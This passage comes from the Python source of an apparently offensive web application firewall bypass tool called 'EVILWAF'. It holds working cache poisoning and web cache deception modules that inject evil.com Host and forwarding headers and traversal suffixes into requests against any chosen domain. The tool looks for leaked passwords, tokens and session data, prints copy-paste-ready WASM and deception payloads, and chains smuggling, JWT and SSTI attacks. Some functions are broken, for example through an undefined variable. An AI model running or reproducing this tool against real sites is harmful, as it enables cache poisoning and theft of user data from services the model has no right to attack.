                payload_type = "BUFFER OVERFLOW"
            elif b'\x60\x00\x01\x7f' in payload and b'\x60\x00\x01\x7e' in payload:
                payload_type = "TYPE CONFUSION"
            else:
                payload_type = "GENERIC WASM"
            
            print(f"\n{Colors.WHITE}{i:>2}. {attack_name:<20} {Colors.CYAN}{payload_type:<15} {status_color}{status:<10}{Colors.END}")
            print(f"{Colors.CYAN}    Size: {payload_size:3} bytes | Magic: {magic_status:<12} | Index: {i-1}{Colors.END}")
            
           
            hex_preview = payload[:20].hex()
            hex_display = ' '.join([hex_preview[j:j+2] for j in range(0, len(hex_preview), 2)])
            print(f"{Colors.YELLOW}    Preview: {hex_display}{'...' if payload_size > 20 else ''}{Colors.END}")
            

            if i-1 < len(results):  # Only for successful payloads
                print(f"{Colors.GREEN}    Copy: b'{payload.hex()}'{Colors.END}")
        

        await asyncio.sleep(0.5)
        
        if results:
            print(f"\n{Colors.CYAN}{'BYPASS RATE BY PAYLOAD TYPE':<25} {'SUCCESS':<8} {'TOTAL':<8} {'RATE':<12}{Colors.END}")
            print(f"{Colors.CYAN}{'─'*25} {'─'*8} {'─'*8} {'─'*12}{Colors.END}")
            
            type_stats = {}
            
            for i, attack_name in enumerate(results):
                payload_type = self.get_wasm_attack_name(i)
                if payload_type not in type_stats:
                    type_stats[payload_type] = {'success': 0, 'total': 0}
                type_stats[payload_type]['success'] += 1
            
            # COUNT TOTAL FOR EACH TYPE
            for i in range(len(wasm_payloads)):
                payload_type = self.get_wasm_attack_name(i)
                if payload_type not in type_stats:
                    type_stats[payload_type] = {'success': 0, 'total': 0}
                type_stats[payload_type]['total'] += 1
            
            for payload_type, stats in type_stats.items():
                success_count = stats['success']
                total_count = stats['total']
                bypass_rate = (success_count / total_count) * 100 if total_count > 0 else 0
                
                rate_color = Colors.GREEN if bypass_rate >= 50 else Colors.YELLOW if bypass_rate >= 25 else Colors.RED
                
                print(f"{Colors.WHITE}{payload_type:<25}{Colors.END} {Colors.GREEN}{success_count:<8}{Colors.END} {Colors.CYAN}{total_count:<8}{Colors.END} {rate_color}{bypass_rate:6.1f}%{'':<6}{Colors.END}")
        

        await asyncio.sleep(0.5)
        
        if wasm_payloads:
            print(f"\n{Colors.BLUE}{'PAYLOAD SIZE ANALYSIS':<25} {'SIZE':<10} {'STATUS':<15}{Colors.END}")
            print(f"{Colors.BLUE}{'─'*25} {'─'*10} {'─'*15}{Colors.END}")
            
            sizes = [len(p) for p in wasm_payloads]
            avg_size = sum(sizes) / len(sizes)
            min_size = min(sizes)
            max_size = max(sizes)
            
            print(f"{Colors.WHITE}{'Average Size':<25}{Colors.END} {Colors.YELLOW}{avg_size:6.1f} bytes{'':<4}{Colors.END} {Colors.CYAN}{'ALL PAYLOADS':<15}{Colors.END}")
            print(f"{Colors.WHITE}{'Smallest Payload':<25}{Colors.END} {Colors.GREEN}{min_size:6} bytes{'':<4}{Colors.END} {Colors.CYAN}{'MINIMUM':<15}{Colors.END}")
            print(f"{Colors.WHITE}{'Largest Payload':<25}{Colors.END} {Colors.RED}{max_size:6} bytes{'':<4}{Colors.END} {Colors.CYAN}{'MAXIMUM':<15}{Colors.END}")
            

            successful_sizes = [len(wasm_payloads[i]) for i in range(len(results)) if i < len(wasm_payloads)]
            if successful_sizes:
                avg_success_size = sum(successful_sizes) / len(successful_sizes)
                print(f"{Colors.WHITE}{'Avg Successful Size':<25}{Colors.END} {Colors.GREEN}{avg_success_size:6.1f} bytes{'':<4}{Colors.END} {Colors.GREEN}{'SUCCESSFUL':<15}{Colors.END}")
        

        if results:
            print(f"\n{Colors.GREEN}{' READY PAYLOADS (SUCCESSFUL)':<80}{Colors.END}")
            print(f"{Colors.GREEN}{'─'*80}{Colors.END}")
            print(f"{Colors.CYAN}# Use these payloads in your code:{Colors.END}\n")
            
            for i, attack_name in enumerate(results, 1):
                payload_index = i - 1
                if payload_index < len(wasm_payloads):
                    payload = wasm_payloads[payload_index]
                    hex_payload = payload.hex()
                    attack_type = attack_name.replace("WASM ", "")
                    
                    print(f"{Colors.YELLOW}# {attack_type} Payload ({len(payload)} bytes){Colors.END}")
                    print(f"{Colors.WHITE}payload_{i} = b'{hex_payload}'{Colors.END}")
                    print()
        
        
        print()
        print_bg_header("", '\033[44m')
        print_bg_header(f" WASM MEMORY CORRUPTION  COMPLETED ", '\033[44m')
        print_bg_header(f" {success_rate:.1f}% BYPASS RATE ({success_payloads}/{total_payloads}) ", '\033[44m')
        print_bg_header(f" {len(wasm_payloads)} PAYLOADS ANALYZED ", '\033[44m')
        print_bg_header("", '\033[44m')

    









    async def cache_poisoning_attack(self, domain):
        """Cache Poisoning Attack Module"""
        print(f"\033[45m PHASE 12: Cache Poisoning Attacks\033[0m")
    
        cache_poisoning_payloads = [
            # Header Injection for Cache Poisoning
            {
                'headers': {'X-Forwarded-Host': 'evil.com'},
                'description': 'X-Forwarded-Host injection'
            },
            {
                'headers': {'Host': 'evil.com'},
                'description': 'Host header injection'
            },
            {
                'headers': {'X-Forwarded-Scheme': 'http'},
                'description': 'Scheme downgrade attack'
            },
            {
                'headers': {'X-Original-URL': '/admin'},
                'description': 'X-Original-URL injection'
            },
            {
                'headers': {'X-Rewrite-URL': '/admin'},
                'description': 'X-Rewrite-URL injection'
            },
            # Cache Key Poisoning
            {
                'headers': {'X-Forwarded-Port': '80'},
                'description': 'Port manipulation'
            },
            {
                'headers': {'X-Forwarded-Proto': 'http'},
                'description': 'Protocol downgrade'
            },
            {
                'headers': {'Accept-Encoding': 'gzip, deflate, br'},
                'description': 'Encoding variation'
            },
            {
                'headers': {'Accept-Language': 'en-US,en;q=0.9'},
                'description': 'Language variation'
            },
            # Cache Buster Techniques
            {
                'headers': {'X-Cache-Buster': 'random123'},
                'description': 'Cache buster header'
            },
            {
                'headers': {'X-Request-ID': 'poison123'},
                'description': 'Request ID poisoning'
            },
            # Cookie Poisoning
            {
                'headers': {'Cookie': 'session=poisoned; user=admin'},
                'description': 'Cookie poisoning'
            },
            # User-Agent Variations
            {
                'headers': {'User-Agent': 'Mozilla/5.0 (EvilBot/1.0)'},
                'description': 'Malicious User-Agent'
            },
            # Referer Poisoning
            {
                'headers': {'Referer': 'https://evil.com/phishing'},
                'description': 'Referer poisoning'
            },
            # Cache Control Manipulation
            {
                'headers': {'Cache-Control': 'no-cache'},
                'description': 'Cache control override'
            },
            {
                'headers': {'Pragma': 'no-cache'},
                'description': 'Pragma header poisoning'
            },
            # API Cache Poisoning
            {
                'headers': {'X-API-Version': 'v2'},
                'description': 'API version poisoning'
            },
            {
                'headers': {'Accept': 'application/json'},
                'description': 'Content type poisoning'
            },
            # Geographic Poisoning
            {
                'headers': {'X-Country-Code': 'US'},
                'description': 'Geo-location poisoning'
            },
            {
                'headers': {'CF-IPCountry': 'US'},
                'description': 'Cloudflare geo-poisoning'
            },
            # Mobile Cache Poisoning
            {
                'headers': {'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1'},
                'description': 'Mobile cache poisoning'
            },
            # Browser-Specific Poisoning
            {
                'headers': {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59'},
                'description': 'Edge browser poisoning'
            },
        ]
    
        successful_poisons = []
        vulnerable_endpoints = []
    
        print(f"{Colors.WHITE}[*] Testing {len(cache_poisoning_payloads)} cache poisoning techniques{Colors.END}")
    
        # Test endpoints that are commonly cached
        test_endpoints = [
            '/', '/index.html', '/home', '/main',
            '/api/data', '/api/users', '/api/config',
            '/static/js/app.js', '/static/css/style.css',
            '/images/logo.png', '/favicon.ico',
            '/blog', '/news', '/articles',
            '/product/1', '/user/profile'
        ]
    
        for payload in cache_poisoning_payloads:
            try:
                poison_success = await self.test_cache_poisoning(domain, payload, test_endpoints)
            
                if poison_success['success']:
                   successful_poisons.append({
                    'payload': payload,
                    'endpoint': poison_success['endpoint'],
                    'evidence': poison_success['evidence']
                  })

                   print(f"{Colors.WHITE}[-] {payload['description']:<40} {Colors.GREEN}Poisoned {poison_success['endpoint']}{Colors.END}")
                                                                      
                else:
                    print(f"{Colors.WHITE}[-] {payload['description']:<40} {Colors.RED}Failed{Colors.END}")
                
            except Exception as e:
                print(f"{Colors.WHITE}[-] {payload['description']:<40} {Colors.RED}ERROR: {str(e)[:30]}{Colors.END}")
        
            await asyncio.sleep(0.3)
    
            # Print comprehensive results
        await self.print_cache_poisoning_results(successful_poisons)
    
        return successful_poisons








    async def test_cache_poisoning(self, domain, payload, endpoints):
        """Test individual cache poisoning technique"""
        for endpoint in endpoints:
            try:
                # First request - poison the cache
                poison_headers = {
                'User-Agent': self.get_random_ua(),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                }
                poison_headers.update(payload['headers'])
            
                # Send poisoning request
                async with self.session.get(
                f"https://{domain}{endpoint}", 
                headers=poison_headers, 
                timeout=8, 
                ssl=False
                ) as poison_response:
                
                    poison_status = poison_response.status
                    poison_content = await poison_response.text()
                    poison_headers_received = dict(poison_response.headers)
                
                    # Check for cache headers that indicate success
                    cache_indicators = self.analyze_cache_poisoning(
                    poison_status, poison_content, poison_headers_received, payload
                    )
                
                    if cache_indicators['is_poisoned']:
                       return {
                           'success': True,
                           'endpoint':     endpoint,
                           'evidence':  cache_indicators['evidence']
                       }
                    
            except Exception as e:
                continue
    
        return {'success': False, 'endpoint': '', 'evidence': ''}










    def analyze_cache_poisoning(self, status, content, headers, payload):
        """Analyze if cache poisoning was successful"""
        evidence = []
        is_poisoned = False
    
        # Check for cache-related headers
        cache_headers = ['cache-control', 'x-cache', 'x-cache-hits', 'cf-cache-status', 'age', 'expires']
    
        for header in cache_headers:
            if header in headers:
                evidence.append(f"{header}: {headers[header]}")
    
        # Status code analysis
        if status in [200, 301, 302, 304, 403, 404]:
            evidence.append(f"Status: {status}")
    
        # Content-based indicators
        content_indicators = [
            'evil.com' in content,
            'poison' in content.lower(),
            'admin' in content.lower(),
            payload['description'].lower() in content.lower()
        ]
    
        if any(content_indicators):
            evidence.append("Content modified")
            is_poisoned = True
    
        # Cache-specific indicators
        cache_status = headers.get('x-cache', '').lower()
        cf_cache = headers.get('cf-cache-status', '').lower()
    
        if 'hit' in cache_status or 'hit' in cf_cache:
            evidence.append("Cache hit detected")
            is_poisoned = True
    
        if 'age' in headers and int(headers.get('age', 0)) > 0:
            evidence.append(f"Cache age: {headers['age']}")
            is_poisoned = True
    
        # Header reflection check
        for header_name, header_value in  payload['headers'].items():
            if header_value in content:
                evidence.append(f"Header reflected: {header_name}")
                is_poisoned = True
    
        return {
            'is_poisoned': is_poisoned,
            'evidence': evidence
        }









    async def print_cache_poisoning_results(self, successful_poisons):
        """Print comprehensive cache poisoning results"""
        print(f"\033[45m[+] CACHE POISONING ATTACK RESULTS\033[0m")
        
        if successful_poisons:
            print(f"{Colors.GREEN}[*] Successful Cache Poisoning Attacks: {len(successful_poisons)}{Colors.END}\n")
        
            for i, poison in enumerate(successful_poisons, 1):
                payload = poison['payload']
                print(f"{Colors.WHITE}{i}. {payload['description']}{Colors.END}")
                print(f"   {Colors.CYAN}Endpoint: {poison['endpoint']}{Colors.END}")
                print(f"   {Colors.YELLOW}Evidence: {', '.join(poison['evidence'])}{Colors.END}")
                print(f"   {Colors.WHITE}Headers: {payload['headers']}{Colors.END}\n")
        else:
            print(f"{Colors.RED}[*] No successful cache poisoning attacks{Colors.END}")
    
        # Additional cache analysis
        print(f"{Colors.CYAN}[*] Cache Poisoning Impact Analysis:{Colors.END}")
        print(f"{Colors.WHITE}   • Header Injection: Can poison cache keys{Colors.END}")
        print(f"{Colors.WHITE}   • Cache Bypass: May bypass WAF through cached responses{Colors.END}")
        print(f"{Colors.WHITE}   • Persistent Attack: Poisoned cache affects all users{Colors.END}")
        print(f"{Colors.WHITE}   • Data Theft: Can steal sensitive data via cache{Colors.END}")
    








    async def advanced_cache_poisoning(self, domain):
        """Advanced Cache Poisoning with Web Cache Deception"""
        print(f"\033[45m PHASE 13: Advanced Cache Poisoning - Web Cache Deception\033[0m")
    
        deception_payloads = [
            # Path-based cache deception
            {'url_suffix': '/.css', 'description': 'CSS extension deception'},
            {'url_suffix': '/.js', 'description': 'JS extension deception'},
            {'url_suffix': '/.png', 'description': 'Image extension deception'},
            {'url_suffix': '/.json', 'description': 'JSON extension deception'},
            {'url_suffix': '/%2e%2e/', 'description': 'URL encoding deception'},
            {'url_suffix': '/..;/', 'description': 'Path traversal deception'},
            {'url_suffix': '/?cache=buster', 'description': 'Parameter-based caching'},
            {'url_suffix': '/#fragment', 'description': 'Fragment-based caching'},
        ]
    
        successful_deceptions = []
    
        for payload in deception_payloads:
            try:
                deception_result = await self.test_web_cache_deception(domain, payload)
            
                if deception_result['success']:
                      successful_deceptions.append(deception_result)
                      print(f"{Colors.WHITE}[-] {payload['description']:<40} {Colors.GREEN}Deception Success{Colors.END}")
                else:
                      print(f"{Colors.WHITE}[-] {payload['description']:<40} {Colors.RED}Failed{Colors.END}")
                
            except Exception as e:
                    print(f"{Colors.WHITE}[-] {payload['description']:<40} {Colors.RED}ERROR{Colors.END}")
        
            await asyncio.sleep(0.3)
    
        return successful_deceptions







    async def test_web_cache_deception(self, domain, payload):
        """Test Web Cache Deception techniques"""
        test_paths = ['/profile', '/account', '/user', '/admin', '/dashboard']
    
        for path in test_paths:
            try:
                deception_url = f"https://{domain}{path}{payload['url_suffix']}"
            
                async with self.session.get(
                    deception_url,
                    headers={'User-Agent': self.get_random_ua()},
                    timeout=8,
                    ssl=False
                ) as response:
                
                    content = await response.text()
                    headers = dict(response.headers)
                
                    # Check for caching indicators
                    if self.is_cache_deception_successful(response.status, content, headers):
                        return {
                            'success': True,
                            'technique':  payload['description'],
                       'url': deception_url,
                       'status': response.status
                        }
                    
            except Exception:
                continue
    
        await self.print_cache_poisoning_summary(domain, results, deception_payloads)
        return {'success': False}




    def is_cache_deception_successful(self, status, content, headers):
        """Improved cache deception detection with comprehensive status handling"""
    
        
        valid_statuses = [200, 301, 302, 304, 403, 404]
    
        if status not in valid_statuses:
            return False
    
        
        cache_indicators = [
            'x-cache' in headers,
            'cf-cache-status' in headers,
            'akamai-cache-status' in headers,
            'fastly-cache-status' in headers,
            'age' in headers and int(headers.get('age', 0)) > 0,
            'x-cache-hits' in headers,
            'via' in headers and 'cache' in headers['via'].lower(),
            'cache-control' in headers and any(x in headers['cache-control'].lower() for x in ['public', 'max-age', 's-maxage']),
            'expires' in headers,
            'last-modified' in headers,
            'etag' in headers
        ]
    
        # Check for specific cache HIT status
        cache_hit_indicators = [
            headers.get('x-cache', '').lower() in ['hit', 'hit from', 'hit_fresh'],
            headers.get('cf-cache-status', '').lower() in ['hit', 'hitt'],
            headers.get('akamai-cache-status', '').lower() in ['hit', 'cached'],
            'age' in headers and int(headers.get('age', 0)) > 10  # Cache ya zaidi ya sekunde 10
        ]
    
        # Sensitive content indicators - expanded
        sensitive_content_indicators = [
        # User data
            'password' in content.lower(),
            'email' in content.lower(),
            'username' in content.lower(),
            'user' in content.lower() and ('profile' in content.lower() or 'account' in content.lower()),
        
            # Admin/Session data
            'admin' in content.lower(),
            'session' in content.lower(),
            'token' in content.lower(),
            'csrf' in content.lower(),
        
             # Personal information
            'address' in content.lower(),
            'phone' in content.lower(),
            'credit' in content.lower() and 'card' in content.lower(),
        
            # API/Sensitive endpoints
            'api' in content.lower() and ('key' in content.lower() or 'secret' in content.lower()),
            'config' in content.lower(),
            'database' in content.lower(),
        
            # Authentication
            'login' in content.lower(),
            'auth' in content.lower(),
            'authenticate' in content.lower(),
        
            # Financial data
            'balance' in content.lower(),
            'payment' in content.lower(),
            'transaction' in content.lower()
        ]
    
        # Additional deception patterns
        deception_patterns = [
        # Content mismatch (CSS/JS file with HTML content)
            len(content) > 1000 and any(ext in headers.get('content-type', '') for ext in ['css', 'javascript']),
        
            # Unexpected status codes for static resources
            status == 200 and any(ext in headers.get('content-type', '') for ext in ['html', 'json']) and any(pattern in content for pattern in ['<html', '{', '"data"']),
        
            # Cache with sensitive headers
            any(cache_hit_indicators) and any(cookie in headers.get('set-cookie', '') for cookie in ['session', 'auth', 'token']),
        
            # Redirect caching with sensitive data
            status in [301, 302] and any(cache_indicators) and 'location' in headers and any(sensitive in headers['location'] for sensitive in ['admin', 'dashboard', 'profile'])
        ]
    
        # Success conditions - flexible based on different scenarios
        success_conditions = [
            # Scenario 1: Cache hit + sensitive content
            (any(cache_hit_indicators) and any(sensitive_content_indicators)),
        
           # Scenario 2: Any cache + strong sensitive content
           (any(cache_indicators) and sum(sensitive_content_indicators) >= 2),
        
           # Scenario 3: Deception patterns detected
           (any(deception_patterns)),
        
           # Scenario 4: Cache with admin/authentication content
           (any(cache_indicators) and any(keyword in content.lower() for keyword in ['admin', 'dashboard', 'control panel'])),
        
           # Scenario 5: Cached error pages with sensitive info (403/404 cached with data)
           (status in [403, 404] and any(cache_indicators) and any(sensitive_content_indicators)),
        
           # Scenario 6: Redirect caching to sensitive locations
           (status in [301, 302] and any(cache_indicators) and any(sensitive in headers.get('location', '') for sensitive in ['admin', 'login', 'dashboard']))
        ]
    
        return any(success_conditions)





    
    async def print_cache_poisoning_summary(self, domain, results, deception_payloads):
        """Print detailed summary for Advanced Cache Poisoning attacks"""
        
        def print_bg_header(text, bg_color):
            import shutil
            try:
                width = shutil.get_terminal_size().columns
            except:
                width = 80
            padding = (width - len(text)) // 2
            spaces = " " * padding + text + " " * (width - len(text) - padding)
            print(f"{bg_color}{Colors.BLACK}{spaces}{Colors.END}")
        
        # 
        print_bg_header("", '\033[45m')
        print_bg_header(" ADVANCED CACHE POISONING - WEB CACHE DECEPTION SUMMARY ", '\033[45m')
        print_bg_header("", '\033[45m')
        
        print(f"\n{Colors.MAGENTA}[+] Generating Cache Poisoning summary...{Colors.END}")
        await asyncio.sleep(1)
        
        # CALCULATE STATISTICS
        total_payloads = len(deception_payloads)
        success_payloads = len(results)
        success_rate = (success_payloads / total_payloads) * 100 if total_payloads > 0 else 0
        

        print(f"\n{Colors.MAGENTA}{'CACHE DECEPTION STATISTICS':<30} {'COUNT':<8} {'PERCENTAGE':<12}{Colors.END}")
        print(f"{Colors.MAGENTA}{'─'*30} {'─'*8} {'─'*12}{Colors.END}")
        
        print(f"{Colors.WHITE}{'Total Techniques Tested':<30}{Colors.END} {Colors.YELLOW}{total_payloads:<8}{Colors.END} {Colors.MAGENTA}100.0%{'':<6}{Colors.END}")
        print(f"{Colors.WHITE}{'Successful Deceptions':<30}{Colors.END} {Colors.GREEN}{success_payloads:<8}{Colors.END} {Colors.MAGENTA}{success_rate:6.1f}%{'':<6}{Colors.END}")
        print(f"{Colors.WHITE}{'Failed Deceptions':<30}{Colors.END} {Colors.RED}{total_payloads-success_payloads:<8}{Colors.END} {Colors.MAGENTA}{(100-success_rate):6.1f}%{'':<6}{Colors.END}")
        
        await asyncio.sleep(0.5)
        

        if results:
            print(f"\n{Colors.GREEN}{'SUCCESSFUL CACHE DECEPTION TECHNIQUES':<80}{Colors.END}")
            print(f"{Colors.GREEN}{'─'*80}{Colors.END}")
            
            for i, result in enumerate(results, 1):
                technique = result['technique']
                url = result['url']
                status = result['status']
                
                print(f"\n{Colors.WHITE}{i:>2}. {technique:<40}{Colors.END}")
                print(f"{Colors.CYAN}    URL: {url}{Colors.END}")
                print(f"{Colors.YELLOW}    Status: {status:<6} | Type: {self.get_deception_type(technique)}{Colors.END}")
                
                # SHOW PAYLOAD USED
                payload_used = self.find_payload_by_description(deception_payloads, technique)
                if payload_used:
                    print(f"{Colors.MAGENTA}    Payload: {payload_used['url_suffix']}{Colors.END}")
        

        print(f"\n{Colors.BLUE}{'DETAILED PAYLOAD ANALYSIS (ALL TECHNIQUES)':<80}{Colors.END}")
        print(f"{Colors.BLUE}{'─'*80}{Colors.END}")
        
        for i, payload in enumerate(deception_payloads, 1):
            description = payload['description']
            url_suffix = payload['url_suffix']
            

            is_successful = any(result['technique'] == description for result in results)
            status = "[*]UCCESS" if is_successful else "[*]AILED"
            status_color = Colors.GREEN if is_successful else Colors.RED
            
            payload_type = self.get_payload_type(url_suffix)
            payload_size = len(url_suffix.encode('utf-8'))
            
            print(f"\n{Colors.WHITE}{i:>2}. {description:<40} {Colors.CYAN}{payload_type:<15} {status_color}{status:<10}{Colors.END}")
            print(f"{Colors.CYAN}    Suffix: {url_suffix:<20} | Size: {payload_size:2} bytes{Colors.END}")
            
            # SHOW COPY-READY FORMAT FOR SUCCESSFUL PAYLOADS
            if is_successful:
                print(f"{Colors.GREEN}    Copy: '{url_suffix}'{Colors.END}")
        

        await asyncio.sleep(0.5)
        
        if results:
            print(f"\n{Colors.MAGENTA}{'DECEPTION TYPES BREAKDOWN':<25} {'SUCCESS':<8} {'TOTAL':<8} {'RATE':<12}{Colors.END}")
            print(f"{Colors.MAGENTA}{'─'*25} {'─'*8} {'─'*8} {'─'*12}{Colors.END}")
            
            type_stats = {}
            
            # COUNT SUCCESS BY TYPE
            for result in results:
                payload_type = self.get_payload_type_from_result(result, deception_payloads)
                if payload_type not in type_stats:
                    type_stats[payload_type] = {'success': 0, 'total': 0}
                type_stats[payload_type]['success'] += 1
            
            # COUNT TOTAL BY TYPE
            for payload in deception_payloads:
                payload_type = self.get_payload_type(payload['url_suffix'])
                if payload_type not in type_stats:
                    type_stats[payload_type] = {'success': 0, 'total': 0}
                type_stats[payload_type]['total'] += 1
            
            for payload_type, stats in type_stats.items():
                success_count = stats['success']
                total_count = stats['total']
                success_rate = (success_count / total_count) * 100 if total_count > 0 else 0
                
                rate_color = Colors.GREEN if success_rate >= 50 else Colors.YELLOW if success_rate >= 25 else Colors.RED
                
                print(f"{Colors.WHITE}{payload_type:<25}{Colors.END} {Colors.GREEN}{success_count:<8}{Colors.END} {Colors.CYAN}{total_count:<8}{Colors.END} {rate_color}{success_rate:6.1f}%{'':<6}{Colors.END}")
        

        await asyncio.sleep(0.5)
        
        if deception_payloads:
            print(f"\n{Colors.CYAN}{'PAYLOAD SIZE ANALYSIS':<25} {'SIZE':<10} {'TYPE':<15}{Colors.END}")
            print(f"{Colors.CYAN}{'─'*25} {'─'*10} {'─'*15}{Colors.END}")
            
            sizes = [len(p['url_suffix'].encode('utf-8')) for p in deception_payloads]
            avg_size = sum(sizes) / len(sizes)
            min_size = min(sizes)
            max_size = max(sizes)
            
            print(f"{Colors.WHITE}{'Average Size':<25}{Colors.END} {Colors.YELLOW}{avg_size:6.1f} chars{'':<4}{Colors.END} {Colors.CYAN}{'ALL PAYLOADS':<15}{Colors.END}")
            print(f"{Colors.WHITE}{'Smallest Payload':<25}{Colors.END} {Colors.GREEN}{min_size:6} chars{'':<4}{Colors.END} {Colors.CYAN}{'MINIMUM':<15}{Colors.END}")
            print(f"{Colors.WHITE}{'Largest Payload':<25}{Colors.END} {Colors.RED}{max_size:6} chars{'':<4}{Colors.END} {Colors.CYAN}{'MAXIMUM':<15}{Colors.END}")
            
            # SUCCESSFUL PAYLOAD SIZES
            successful_sizes = [len(self.find_payload_by_description(deception_payloads, r['technique'])['url_suffix'].encode('utf-8')) 
                              for r in results if self.find_payload_by_description(deception_payloads, r['technique'])]
            if successful_sizes:
                avg_success_size = sum(successful_sizes) / len(successful_sizes)
                print(f"{Colors.WHITE}{'Avg Successful Size':<25}{Colors.END} {Colors.GREEN}{avg_success_size:6.1f} chars{'':<4}{Colors.END} {Colors.GREEN}{'SUCCESSFUL':<15}{Colors.END}")
        

        if results:
            print(f"\n{Colors.GREEN}{'COPY-PASTE READY PAYLOADS (SUCCESSFUL ONLY)':<80}{Colors.END}")
            print(f"{Colors.GREEN}{'─'*80}{Colors.END}")
            print(f"{Colors.CYAN}# Use these deception techniques in your code:{Colors.END}\n")
            
            for i, result in enumerate(results, 1):
                technique = result['technique']
                payload = self.find_payload_by_description(deception_payloads, technique)
                
                if payload:
                    url_suffix = payload['url_suffix']
                    payload_size = len(url_suffix.encode('utf-8'))
                    
                    print(f"{Colors.YELLOW}# {technique} ({payload_size} chars){Colors.END}")
                    print(f"{Colors.WHITE}payload_{i} = '{url_suffix}'{Colors.END}")
                    print(f"{Colors.CYAN}# Usage: /profile{url_suffix} or /account{url_suffix}{Colors.END}")
                    print()
        

        await asyncio.sleep(0.5)
        
        if results:
            print(f"\n{Colors.RED}{'SECURITY IMPACT ASSESSMENT':<40} {'SEVERITY':<15} {'RISK':<15}{Colors.END}")
            print(f"{Colors.RED}{'─'*40} {'─'*15} {'─'*15}{Colors.END}")
            
            impacts = []
            

            extension_deceptions = sum(1 for r in results if any(ext in r['technique'] for ext in ['.css', '.js', '.png', '.json']))
            if extension_deceptions > 0:
                impacts.append((
                    "STATIC RESOURCE DECEPTION",
                    "HIGH",
                    "SENSITIVE DATA LEAK"
                ))
            
            encoding_deceptions = sum(1 for r in results if any(enc in r['technique'] for enc in ['encoding', 'traversal']))
            if encoding_deceptions > 0:
                impacts.append((
                    "PATH TRAVERSAL DECEPTION", 
                    "MEDIUM",
                    "UNAUTHORIZED ACCESS"
                ))
            
            param_deceptions = sum(1 for r in results if 'parameter' in r['technique'].lower())
            if param_deceptions > 0:
                impacts.append((
                    "PARAMETER CACHE POISONING",
                    "LOW", 
                    "CACHE POLLUTION"
                ))
            
            fragment_deceptions = sum(1 for r in results if 'fragment' in r['technique'].lower())
            if fragment_deceptions > 0:
                impacts.append((
                    "FRAGMENT CACHE ABUSE",
                    "LOW",
                    "CACHE INJECTION"
                ))
            
            for impact, severity, risk in impacts:
                severity_color = Colors.RED if severity == "HIGH" else Colors.YELLOW if severity == "MEDIUM" else Colors.GREEN
                print(f"{Colors.WHITE}{impact:<40}{Colors.END} {severity_color}{severity:<15}{Colors.END} {Colors.CYAN}{risk:<15}{Colors.END}")
        

        print()
        print_bg_header("", '\033[45m')
        print_bg_header(f" CACHE POISONING SCAN COMPLETED ", '\033[45m')
        print_bg_header(f" {success_rate:.1f}% SUCCESS RATE ({success_payloads}/{total_payloads}) ", '\033[45m')
        print_bg_header(f" {len(deception_payloads)} TECHNIQUES ANALYZED ", '\033[45m')
        print_bg_header("", '\033[45m')

    def get_deception_type(self, technique):
        """Get deception type from technique description"""
        if any(ext in technique for ext in ['.css', '.js', '.png', '.json']):
            return "EXTENSION DECEPTION"
        elif any(enc in technique for enc in ['encoding', 'traversal']):
            return "ENCODING DECEPTION"
        elif 'parameter' in technique.lower():
            return "PARAMETER DECEPTION"
        elif 'fragment' in technique.lower():
            return "FRAGMENT DECEPTION"
        else:
            return "GENERIC DECEPTION"

    def get_payload_type(self, url_suffix):
        """Get payload type from URL suffix"""
        if any(ext in url_suffix for ext in ['.css', '.js', '.png', '.json']):
            return "EXTENSION"
        elif any(enc in url_suffix for enc in ['%2e', '..', ';/']):
            return "ENCODING"
        elif '?' in url_suffix:
            return "PARAMETER"
        elif '#' in url_suffix:
            return "FRAGMENT"
        else:
            return "PATH"

    def get_payload_type_from_result(self, result, deception_payloads):
        """Get payload type from result"""
        payload = self.find_payload_by_description(deception_payloads, result['technique'])
        if payload:
            return self.get_payload_type(payload['url_suffix'])
        return "UNKNOWN"

    def find_payload_by_description(self, deception_payloads, description):
        """Find payload by description"""
        for payload in deception_payloads:
            if payload['description'] == description:
                return payload
        return None







    


    async def ultimate_bypass(self, domain, output_file=None):
        """Ultimate bypass attack with ALL techniques"""
        domain = self.normalize_domain(domain)  # FIX URL PARSING
        
        print(f"{Colors.CYAN}[*] Starting Ultimate Bypass Attack{Colors.END}")
        print(f"{Colors.CYAN}[*] Target: {domain}{Colors.END}")
        
        await self.init_session()
        
        try:
            # Detect firewall
            firewall, confidence = await self.detector.detect_firewall(domain)
            
            # Execute all bypass methods
            all_results = {}
            
            valid_subs = await self.smart_subdomain_validation(domain)
            
            
            
            all_results['subdomains'] = await self.test_valid_subdomains(domain, valid_subs)
               
 

            
            all_results['dns_history'] = await self.dns_history_bypass(domain)
            
            
            
            
            all_results['headers'] = await self.header_manipulation(domain)
            
            
            
            all_results['http_smuggling'] = await self.http_request_smuggling(domain)
            
            
            
            all_results['jwt_confusion'] = await self.jwt_algorithm_confusion(domain)
            
            
            all_results['graphql_batching'] = await self.graphql_batching_bypass(domain)
            
            
            all_results['grpc_protobuf'] = await self.grpc_protobuf_bypass(domain)
            
            
            all_results['ssti_polyglot'] = await self.ssti_polyglot_attack(domain)
           

            all_results['ml_waf'] = await self.ml_waf_evasion(domain)
              

            all_results['http2_stream'] = await self.http2_stream_multiplexing(domain)
              
            all_results['wasm_memory'] = await self.wasm_memory_corruption(domain)
              
            all_results['cache_poisoning'] = await self.cache_poisoning_attack(domain)          
          
          
            all_results['web_cache_deception'] = await self.advanced_cache_poisoning(domain)     


              








            
            # Save results
            if output_file:
                with open(output_file, 'w') as f:
                    json.dump(all_results, f, indent=2)
                print(f"{Colors.GREEN}[+] Results saved to: {output_file}{Colors.END}")
            
            # Display results
            self.display_results(all_results, domain, firewall)
            
            return all_results
            
        except Exception as e:
            print(f"{Colors.RED}[!] Critical error: {e}{Colors.END}")
            return {}
        finally:
            await self.close_session()

    def display_results(self, results, domain, firewall):
        """Display comprehensive results"""
        print(f"\n{Colors.GREEN}{'='*60}{Colors.END}")
        print(f"{Colors.GREEN}[+] EVILWAF BYPASS COMPLETED{Colors.END}")
        print(f"{Colors.GREEN}{'='*60}{Colors.END}")
        
        total_success = 0
        technique_count = 0
        
        for method, items in results.items():
            success_count = len(items)
            total_success += success_count
            technique_count += 1
            
            status_color = Colors.GREEN if success_count > 0 else Colors.RED
